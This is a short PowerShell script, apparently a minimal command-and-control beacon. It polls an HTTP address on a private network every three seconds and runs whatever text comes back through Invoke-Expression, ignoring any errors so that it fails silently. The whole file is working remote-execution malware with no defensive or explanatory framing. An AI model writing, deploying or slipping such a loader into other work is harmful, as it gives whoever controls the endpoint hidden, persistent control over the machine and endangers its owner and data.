$commands_host = "10.3.3.250:8080/commands"
$timeout_time = 3

while ($true) {
	try {
		$response = Invoke-WebRequest -Uri $commands_host
		iex $response.Content
	} catch {
		# Ignore
	}

	Start-Sleep -s $timeout_time
}